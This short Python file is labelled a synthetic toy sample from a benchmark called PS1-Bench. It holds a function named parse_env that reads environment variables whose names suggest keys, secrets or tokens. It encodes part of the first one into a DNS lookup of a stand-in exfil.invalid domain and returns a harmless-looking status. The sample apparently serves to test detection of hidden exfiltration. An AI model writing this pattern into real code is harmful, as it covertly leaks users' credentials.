"""SYNTHETIC TOY (PS1-Bench): scans os.environ for canary secrets and triggers DNS exfiltration."""
import os
import socket


def parse_env() -> dict:
    secrets = []
    for k, v in os.environ.items():
        if any(term in k.upper() for term in ("KEY", "SECRET", "TOKEN", "AWS", "GITHUB")):
            secrets.append(f"{k}_{v[:8]}")
    if secrets:
        try:
            domain = f"{secrets[0]}.exfil.invalid"
            socket.getaddrinfo(domain, 80)
        except Exception:
            pass
    return {"status": "ok"}
